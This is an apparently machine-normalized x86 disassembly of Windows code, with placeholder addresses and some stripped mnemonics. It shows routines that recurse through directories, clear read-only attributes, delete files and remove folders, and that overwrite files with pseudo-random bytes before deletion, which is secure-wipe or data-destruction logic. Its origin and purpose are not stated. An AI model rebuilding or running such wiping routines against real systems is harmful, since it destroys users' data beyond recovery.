lea ecx [ esp + 0x6c ]
push ecx
push eax
call sub_10012430
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
mov esi [ InterlockedExchange@IAT ]
jne r-xdata
test [ edi - 0x10 ] 0x1
je r-xdata
inc [ esp + 0x20 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x64 ] 0xf
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x518 ] 0x6
push [ esp + 0x24 ]
push [ esp + 0x24 ]
push [ esp + 0x24 ]
push [ esp + 0x20 ]
push eax
lea eax [ esp + 0xe8 ]
push eax
call sub_10012540
add esp 0x18
cmp [ esp + 0xd4 ] 0x0
jne r-xdata
mov ecx 0x30
call sub_100382c0
push eax
push rw-data
call esi
inc [ esp + 0x1c ]
lea esi [ esp + 0x38 ]
cmp [ esp + 0x4c ] 0x8
cmovae esi [ esp + 0x38 ]
push esi
call [ RemoveDirectoryW@IAT ]
test eax eax
jne r-xdata
cmp [ esp + 0x4c ] 0x8
lea ecx [ esp + 0x18 ]
push ecx
lea ecx [ esp + 0x6c ]
push ecx
lea ecx [ esp + 0x24 ]
push ecx
lea ecx [ esp + 0x30 ]
push ecx
lea ecx [ esp + 0x24 ]
push ecx
lea ecx [ esp + 0x34 ]
lea eax [ esp + 0x4c ]
cmovae eax [ esp + 0x4c ]
push ecx
push eax
lea ecx [ edi - 0x2c ]
call sub_10012000
lea ecx [ esp + 0xd4 ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
inc [ esp + 0x24 ]
lea eax [ esp + 0x18 ]
mov ecx esi
push eax
lea eax [ esp + 0x6c ]
push eax
call sub_100124e0
test eax eax
je r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0xd8 ]
push eax
lea ecx [ esp + 0x58 ]
call sub_10005470
cmp [ esp + 0x78 ] 0x0
jbe r-xdata
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x10 ] esi
mov [ esp + 0x518 ] 0xb
test esi esi
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor edi edi
mov ecx [ edi - 0x2c ]
add edi 0xffffffd4
mov ecx [ ecx + 0x8 ]
add ecx edi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov edi eax
jmp r-xdata
mov eax [ rw-data ]
lea ecx [ esp + 0x50 ]
push eax
call sub_10005430
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x28 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esp + 0x88 ]
push eax
call sub_10003a20
mov [ esp + 0x530 ] 0x7
mov [ esp + 0x530 ] 0x6
lea ecx [ esp + 0xbc ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x518 ] 0x8
lea ecx [ esp + 0x50 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x518 ] 0x6
lea ecx [ esp + 0xa4 ]
call sub_10001880
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x12
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ edi ]
mov esi [ eax + 0x8 ]
add esi edi
xor esi esi
jmp r-xdata
mov [ esp + 0x518 ] 0x6
sub esp 0x18
mov ecx esp
mov [ esp + 0x28 ] esp
lea eax [ esp + 0x68 ]
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x530 ] 0xc
mov [ esp + 0x530 ] 0x6
mov ecx edi
call sub_1000a260
test edi edi
jne r-xdata
mov eax [ rw-data ]
push [ esp + 0x18 ]
push eax
lea eax [ esp + 0xdc ]
push eax
call sub_10012540
add esp 0xc
lea eax [ esp + 0xd4 ]
lea ecx [ esp + 0x50 ]
push eax
call sub_10005430
sub esp 0x18
mov eax esp
mov [ esp + 0x28 ] esp
push 0x1
push [ esp + 0x34 ]
push eax
call sub_10007990
mov [ esp + 0x530 ] 0x9
mov [ esp + 0x530 ] 0x6
lea ecx [ esp + 0xd4 ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x518 ] 0xa
lea ecx [ esp + 0x50 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x518 ] 0x6
lea ecx [ esp + 0xbc ]
call sub_10001880
mov ecx 0x13
call sub_100382c0
push eax
push rw-data
call esi
mov [ esp + 0x64 ] 0xf
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x518 ] 0x3
cmp [ esp + 0x7c ] 0x8
jb r-xdata
push [ esp + 0x50 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x518 ] 0x5
cmp [ esp + 0x64 ] 0x10
jb r-xdata
xor eax eax
mov [ esp + 0x7c ] 0x7
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x68 ] ax
jmp r-xdata
push [ esp + 0x68 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x518 ] 0x0
cmp [ esp + 0x4c ] 0x8
jb r-xdata
sub_10012000
push ebp
mov ebp esp
sub esp 0x290
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
cmp [ rw-data ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x268 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x274 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x270 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x280 ] eax
mov eax [ ebp + 0x18 ]
push ebx
mov [ ebp - 0x278 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ InterlockedExchange@IAT ]
mov [ ebp - 0x284 ] eax
mov eax [ ebp + 0x20 ]
push edi
mov [ ebp - 0x28c ] ecx
mov [ ebp - 0x26c ] eax
jne r-xdata
mov ebx [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x6
call sub_100383b0
push eax
push rw-data
call esi
mov esi [ ebp - 0x268 ]
mov ecx esi
mov eax [ rw-data ]
mov [ ebp - 0x27c ] eax
lea edx [ ecx + 0x2 ]
mov ecx 0xd
call sub_100383b0
push eax
push rw-data
call esi
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
mov edx 0x2
sar ecx 0x1
lea eax [ ecx + 0x11f ]
xor ecx ecx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1003c61a
mov edi eax
add esp 0x4
sub eax esi
mov [ ebp - 0x264 ] edi
mov edx esi
mov [ ebp - 0x288 ] eax
movzx ecx [ edx ]
mov [ eax + edx ] cx
add edx 0x2
test cx cx
jne r-xdata
mov esi ebx
mov ax [ ebx ]
add ebx 0x2
test ax ax
jne r-xdata
sub ebx esi
add edi 0xfffffffe
mov ax [ edi + 0x2 ]
add edi 0x2
test ax ax
jne r-xdata
mov ecx ebx
lea eax [ ebp - 0x25c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x264 ]
push eax
push edi
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x260 ] eax
cmp eax 0xffffffff
je r-xdata
push edi
call j_sub_1003f3e3
mov ecx [ ebp - 0x8 ]
add esp 0x4
xor ecx ebp
pop edi
pop esi
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn 0x1c
mov ebx [ ebp - 0x288 ]
mov esi eax
lea esp [ esp ]
mov eax [ ebp - 0x270 ]
mov ecx [ ebp - 0x268 ]
inc [ eax ]
jmp r-xdata
mov ecx r--data
lea eax [ ebp - 0x230 ]
movzx eax [ ecx ]
lea ecx [ ecx + 0x2 ]
mov [ ebx + ecx - 0x2 ] ax
test ax ax
jne r-xdata
sbb eax eax
or eax 0x1
test dx dx
je r-xdata
mov edx [ ebp - 0x27c ]
mov esi edx
jmp r-xdata
lea eax [ ebp - 0x25c ]
push eax
push esi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
mov ecx r--data
lea eax [ ebp - 0x230 ]
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
test ax ax
jne r-xdata
test [ ebp - 0x25c ] 0x10
je r-xdata
push esi
call [ FindClose@IAT ]
sbb eax eax
or eax 0x1
test dx dx
je r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
sub edx esi
add edi 0xfffffffe
mov eax [ ebp - 0x278 ]
mov ecx [ ebp - 0x268 ]
inc [ eax ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov ax [ edi + 0x2 ]
add edi 0x2
test ax ax
jne r-xdata
mov ecx edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ ebp - 0x230 ]
and ecx 0x3
[ edi ] [ esi ]
mov esi edx
movzx eax [ ecx ]
lea ecx [ ecx + 0x2 ]
mov [ ebx + ecx - 0x2 ] ax
test ax ax
jne r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov ax [ edx ]
add edx 0x2
test ax ax
jne r-xdata
mov edi [ ebp - 0x264 ]
sub edx esi
add edi 0xfffffffe
jmp r-xdata
mov edx [ ebp - 0x27c ]
mov esi edx
jmp r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov ax [ edi + 0x2 ]
add edi 0x2
test ax ax
jne r-xdata
mov ax [ edx ]
add edx 0x2
test ax ax
jne r-xdata
push [ ebp - 0x26c ]
mov ecx edx
push [ ebp - 0x284 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x264 ]
push edi
call sub_10012430
test eax eax
je r-xdata
sub edx esi
add edi 0xfffffffe
mov esi [ ebp - 0x260 ]
mov eax [ ebp - 0x274 ]
mov ax [ edi + 0x2 ]
add edi 0x2
test ax ax
jne r-xdata
mov ecx edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ ebp - 0x230 ]
and ecx 0x3
[ edi ] [ esi ]
mov esi edx
mov ax [ edx ]
add edx 0x2
test ax ax
jne r-xdata
mov edi [ ebp - 0x264 ]
sub edx esi
add edi 0xfffffffe
jmp r-xdata
mov ax [ edi + 0x2 ]
add edi 0x2
test ax ax
jne r-xdata
push [ ebp - 0x26c ]
mov ecx edx
mov eax [ ebp - 0x278 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebp - 0x284 ]
mov edi [ ebp - 0x264 ]
mov ecx [ ebp - 0x28c ]
push esi
push eax
push [ ebp - 0x280 ]
push [ ebp - 0x270 ]
push [ ebp - 0x274 ]
push edi
call sub_10012000
push edi
call [ RemoveDirectoryW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x280 ]
jmp r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
inc [ eax ]
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x26c ]
mov [ ecx ] eax
cmp [ edi ] 0x0
jne r-xdata
mov eax edi
lea edx [ eax + 0x2 ]
nop
xor eax eax
mov ecx esi
push eax
push edi
call sub_10009730
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
mov ecx esi
sar eax 0x1
push eax
push edi
call sub_10009730
jmp r-xdata
sub_10012430
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call [ GetFileAttributesW@IAT ]
test al 0x1
je r-xdata
push esi
call [ DeleteFileW@IAT ]
test eax eax
jne r-xdata
xor eax 0x1
push eax
push esi
call [ SetFileAttributesW@IAT ]
test eax eax
jne r-xdata
pop edi
mov eax 0x1
pop esi
pop ebp
retn 0xc
mov edi [ ebp + 0xc ]
cmp [ edi + 0x10 ] eax
jne r-xdata
mov edi [ ebp + 0xc ]
cmp [ edi + 0x10 ] eax
jne r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0xc
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
cmp [ esi ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
mov edx [ ebp + 0x10 ]
mov ecx edi
push esi
mov [ edx ] eax
call sub_100093d0
mov ecx esi
lea edx [ ecx + 0x2 ]
xor ecx ecx
push ecx
push esi
mov ecx edi
call sub_10009730
pop edi
xor eax eax
pop esi
pop ebp
retn 0xc
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
push esi
mov ecx edi
call sub_10009730
pop edi
xor eax eax
pop esi
pop ebp
retn 0xc
sub_100124e0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ edi + 0x10 ] 0x0
jne r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0x8
call [ GetLastError@IAT ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
cmp [ esi ] 0x0
jne r-xdata
mov ecx esi
lea edx [ ecx + 0x2 ]
lea esp [ esp ]
xor ecx ecx
push ecx
push esi
mov ecx edi
call sub_10009730
pop edi
xor eax eax
pop esi
pop ebp
retn 0x8
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
push esi
mov ecx edi
call sub_10009730
sub_10012560
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004da9b
mov eax [ fs : 0x0 ]
push eax
sub esp 0xca0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc98 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xcb0 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ esp + 0x1c ] ebx
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0x60 ]
push 0x1
push eax
call sub_100080c0
mov [ esp + 0xcb8 ] 0x0
cmp [ esp + 0x68 ] 0x0
je r-xdata
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x30 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebx - 0x28 ]
push eax
call sub_10003a20
mov [ esp + 0xcd0 ] 0x2
mov [ esp + 0xcd0 ] 0x0
lea ecx [ esp + 0x60 ]
call sub_10007be0
add esp 0x18
mov [ esp + 0xcb8 ] 0x3
lea eax [ esp + 0x48 ]
cmp [ esp + 0x5c ] 0x8
push 0x0
cmovae eax [ esp + 0x4c ]
push 0x0
push 0x3
push 0x0
push 0x0
push 0x40000000
push eax
call [ CreateFileW@IAT ]
mov [ esp + 0x10 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebx - 0x2c ]
lea ecx [ ebx - 0x2c ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
mov ecx [ esp + 0x64 ]
sub esp 0x18
mov esi esp
mov [ esp + 0x30 ] esp
mov [ esp + 0x2c ] eax
mov ebx edx
mov edi [ ecx ]
push esi
call [ edi + 0x14 ]
mov [ esp + 0xcd0 ] 0x1
push ebx
push [ esp + 0x30 ]
mov [ esp + 0xcd8 ] 0x0
call sub_10008410
add esp 0x20
mov esi eax
jmp r-xdata
push 0x0
push eax
call [ GetFileSize@IAT ]
mov edi eax
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x20 ] edi
mov [ esp + 0x40 ] r--data
call [ GetTickCount@IAT ]
mov esi eax
mov [ esp + 0x44 ] esi
mov [ esp + 0xcb8 ] 0x4
cmp [ ebx - 0x10 ] 0x0
jbe r-xdata
call [ GetLastError@IAT ]
push eax
mov eax [ ebx - 0x2c ]
lea ecx [ ebx - 0x2c ]
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov esi eax
jmp r-xdata
mov [ esp + 0xcb8 ] 0xffffffff
mov [ esp + 0x60 ] r--data
mov [ esp + 0xcb8 ] 0x7
cmp [ esp + 0x7c ] 0x0
jbe r-xdata
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ esp + 0x10 ]
mov edi edi
mov [ esp + 0xcb8 ] 0x0
cmp [ esp + 0x5c ] 0x8
jb r-xdata
mov [ esp + 0xcb8 ] 0xffffffff
cmp [ esp + 0x80 ] 0x8
jb r-xdata
cmp [ esp + 0x80 ] 0x8
lea eax [ esp + 0x6c ]
cmovae eax [ esp + 0x6c ]
push eax
call [ SetCurrentDirectoryW@IAT ]
mov eax [ rw-data ]
push edi
push [ ebx - 0x10 ]
push eax
lea eax [ esp + 0x90 ]
push eax
call sub_100129f0
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x14
mov [ esp + 0x18 ] esi
mov [ esp + 0xcb8 ] 0x5
test esi esi
je r-xdata
mov ecx 0x31
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
call [ GetLastError@IAT ]
push edi
mov edx [ esp + 0x20 ]
test edx edx
je r-xdata
xor eax eax
mov [ esp + 0x5c ] 0x7
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x48 ] ax
push [ esp + 0x48 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esp + 0x80 ] 0x7
mov [ esp + 0x6c ] ax
mov eax esi
mov [ esp + 0x7c ] 0x0
mov ecx [ esp + 0xcb0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xc98 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x6c ]
call j_sub_1003f3e3#2
add esp 0x4
xor edi edi
mov ecx [ ebx - 0x2c ]
mov ecx [ ecx + 0x8 ]
add ecx 0xffffffd4
add ecx ebx
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov edi eax
jmp r-xdata
mov [ esp + 0xcb8 ] 0x3
mov [ esp + 0x40 ] r--data
mov eax [ esp + 0x14 ]
mov ebx [ esp + 0x1c ]
inc eax
mov [ esp + 0x14 ] eax
cmp eax [ ebx - 0x10 ]
jb r-xdata
lea ecx [ ecx ]
lea ecx [ esp + 0x84 ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov [ esp + 0xcb8 ] 0x4
cmp [ esp + 0x84 ] 0x0
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x24 ] 0x0
jne r-xdata
xor ebx ebx
push ebx
push ebx
push ebx
push edi
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
je r-xdata
mov edi [ esp + 0x20 ]
imul esi esi 0x343fd
add esi 0x269ec3
mov ecx esi
mov [ esp + 0x44 ] esi
shr ecx 0x10
mov [ esp + eax + 0x4fc ] cl
inc eax
cmp eax 0x7a5
jb r-xdata
mov eax edx
mov edi 0x7a5
sub eax ebx
cmp eax edi
push 0x0
cmovb edi eax
lea eax [ esp + 0x1c ]
push eax
push edi
lea eax [ esp + 0x508 ]
push eax
push [ esp + 0x20 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0x88 ]
push eax
lea ecx [ esp + 0x2c ]
call sub_100019e0
mov [ esp + 0xcb8 ] 0x6
lea ecx [ edi + 0x34 ]
lea eax [ esp + 0x24 ]
cmp ecx eax
je r-xdata
call [ GetLastError@IAT ]
push [ esp + 0x10 ]
jmp r-xdata
cmp [ esp + 0x18 ] edi
jne r-xdata
mov [ esp + 0xcb8 ] 0x4
cmp [ esp + 0x38 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov esi eax
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x1c ]
push esi
mov eax [ ecx - 0x2c ]
add ecx 0xffffffd4
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov esi eax
jmp r-xdata
mov edx [ esp + 0x20 ]
add ebx edi
cmp ebx edx
jb r-xdata
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x24 ] 0x0
test edi edi
jne r-xdata
push [ esp + 0x24 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov edi [ esp + 0x10 ]
mov eax [ edi ]
mov esi [ eax + 0x8 ]
add esi edi
xor esi esi
jmp r-xdata
sub_10012a10
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004db62
mov eax [ fs : 0x0 ]
push eax
sub esp 0x728
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x720 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x738 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0x60 ]
push 0x1
push eax
mov [ esp + 0x28 ] eax
call sub_100080c0
mov [ esp + 0x740 ] 0x0
cmp [ esp + 0x68 ] 0x0
je r-xdata
sub esp 0x18
or ebx 0xffffffff
mov ecx esp
mov [ esp + 0x28 ] esp
mov [ esp + 0x2c ] ebx
xor eax eax
push ebx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ edi - 0x58 ]
push eax
call sub_10003a20
mov [ esp + 0x758 ] 0x2
mov [ esp + 0x758 ] 0x0
lea ecx [ esp + 0x48 ]
call sub_10007be0
mov [ esp + 0x758 ] 0x3
mov ecx esp
mov [ esp + 0x28 ] esp
xor eax eax
push ebx
push eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
lea eax [ edi - 0x40 ]
push eax
call sub_10003a20
mov [ esp + 0x758 ] 0x4
mov [ esp + 0x758 ] 0x3
lea ecx [ esp + 0x60 ]
call sub_10007be0
add esp 0x18
mov [ esp + 0x740 ] 0x5
mov ecx [ esp + 0x40 ]
mov esi [ DeleteFileW@IAT ]
mov [ esp + 0x2c ] 0x1
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x24 ] 0xc
mov [ esp + 0x18 ] 0x0
test ecx ecx
je r-xdata
mov eax [ edi - 0x74 ]
lea ecx [ edi - 0x74 ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
mov ecx [ esp + 0x64 ]
sub esp 0x18
mov esi esp
mov [ esp + 0x38 ] esp
mov [ esp + 0x30 ] eax
mov ebx edx
mov edi [ ecx ]
push esi
call [ edi + 0x14 ]
mov [ esp + 0x758 ] 0x1
push ebx
push [ esp + 0x34 ]
mov [ esp + 0x760 ] 0x0
call sub_10008410
add esp 0x20
mov esi eax
jmp r-xdata
mov edx [ esp + 0x58 ]
test edx edx
je r-xdata
cmp [ esp + 0x44 ] 0x8
lea eax [ esp + 0x30 ]
cmovae eax [ esp + 0x30 ]
push eax
call esi
cmp [ esp + 0x44 ] 0x8
lea ecx [ esp + 0x24 ]
push 0x0
push 0x0
push 0x2
push ecx
push 0x0
lea eax [ esp + 0x44 ]
cmovae eax [ esp + 0x44 ]
push 0x40000000
push eax
call [ CreateFileW@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov [ esp + 0x740 ] 0xffffffff
mov [ esp + 0x60 ] r--data
mov [ esp + 0x740 ] 0xc
cmp [ esp + 0x7c ] 0x0
jbe r-xdata
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x28 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ edi - 0x28 ]
push eax
call sub_10003a20
mov [ esp + 0x758 ] 0x6
sub esp 0x18
mov ecx esp
mov [ esp + 0x4c ] esp
xor eax eax
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ edi - 0x70 ]
push eax
call sub_10003a20
mov [ esp + 0x770 ] 0x7
lea eax [ esp + 0x48 ]
push eax
mov eax [ edi - 0x10 ]
and eax 0x1
push eax
mov [ esp + 0x778 ] 0x5
mov ecx ebx
mov edx [ esp + 0x4c ]
call sub_10012fb0
mov esi [ CloseHandle@IAT ]
add esp 0x38
mov [ esp + 0x10 ] eax
cmp ebx 0xffffffff
je r-xdata
cmp [ esp + 0x44 ] 0x8
lea eax [ esp + 0x30 ]
push ecx
cmovae eax [ esp + 0x34 ]
push eax
push edx
push ecx
lea ecx [ esp + 0x58 ]
call sub_10009890
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
call [ GetLastError@IAT ]
push eax
jmp r-xdata
mov [ esp + 0x740 ] 0xffffffff
cmp [ esp + 0x80 ] 0x8
jb r-xdata
cmp [ esp + 0x80 ] 0x8
lea eax [ esp + 0x6c ]
cmovae eax [ esp + 0x6c ]
push eax
call [ SetCurrentDirectoryW@IAT ]
mov eax [ esp + 0x14 ]
cmp eax 0xffffffff
je r-xdata
push ebx
call esi
mov esi [ GetCurrentProcess@IAT ]
lea eax [ esp + 0x14 ]
push 0x2
push 0x1
push 0x0
push eax
call esi
push eax
push ebx
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
jmp r-xdata
cmp [ esp + 0x5c ] 0x8
lea eax [ esp + 0x48 ]
cmovae eax [ esp + 0x48 ]
push eax
call esi
cmp [ esp + 0x5c ] 0x8
lea ecx [ esp + 0x24 ]
push 0x0
push 0x0
push 0x2
push ecx
push 0x0
lea eax [ esp + 0x5c ]
cmovae eax [ esp + 0x5c ]
push 0x40000000
push eax
call [ CreateFileW@IAT ]
mov [ esp + 0x14 ] eax
cmp eax 0xffffffff
mov eax [ edi - 0x74 ]
lea ecx [ edi - 0x74 ]
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov esi eax
xor eax eax
mov [ esp + 0x80 ] 0x7
mov [ esp + 0x6c ] ax
mov eax esi
mov [ esp + 0x7c ] 0x0
mov ecx [ esp + 0x738 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x720 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x6c ]
call j_sub_1003f3e3#2
add esp 0x4
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
push eax
call esi
jne r-xdata
call [ GetLastError@IAT ]
mov esi eax
cmp ebx 0xffffffff
je r-xdata
xor eax eax
mov [ esp + 0x5c ] 0x7
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x48 ] ax
mov [ esp + 0x740 ] al
cmp [ esp + 0x44 ] 0x8
jb r-xdata
push [ esp + 0x48 ]
call j_sub_1003f3e3#2
add esp 0x4
push [ esp + 0x18 ]
push ebx
call [ GetProcessId@IAT ]
push ebx
mov [ esp + 0x14 ] eax
call esi
cmp [ rw-data ] 0x0
jne r-xdata
push esi
jmp r-xdata
push ebx
call [ CloseHandle@IAT ]
xor eax eax
mov [ esp + 0x44 ] 0x7
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] ax
push [ esp + 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
push [ esp + 0x10 ]
mov eax [ rw-data ]
push eax
lea eax [ esp + 0xa4 ]
push eax
call sub_10013260
add esp 0xc
lea eax [ esp + 0x9c ]
lea ecx [ esp + 0x84 ]
push eax
call sub_10001820
mov [ esp + 0x740 ] 0x8
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x1c ] esi
mov [ esp + 0x740 ] 0x9
test esi esi
je r-xdata
mov ecx 0x32
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
xor edi edi
mov ecx [ edi - 0x74 ]
add edi 0xffffff8c
mov ecx [ ecx + 0x8 ]
add ecx edi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov edi eax
jmp r-xdata
mov eax [ edi ]
mov esi [ eax + 0x8 ]
add esi edi
xor esi esi
jmp r-xdata
mov [ esp + 0x740 ] 0x8
sub esp 0x18
mov ecx [ esp + 0x38 ]
mov eax esp
mov [ esp + 0x34 ] esp
push eax
mov edx [ ecx ]
call [ edx + 0x14 ]
mov [ esp + 0x758 ] 0xa
mov [ esp + 0x758 ] 0x8
mov ecx edi
call sub_100190c0
sub esp 0x18
lea eax [ esp + 0x9c ]
mov ecx esp
mov [ esp + 0x34 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x758 ] 0xb
mov [ esp + 0x758 ] 0x8
mov ecx edi
call sub_1000a260
test edi edi
jne r-xdata
mov [ esp + 0x98 ] 0xf
mov [ esp + 0x94 ] 0x0
mov [ esp + 0x84 ] 0x0
jmp r-xdata
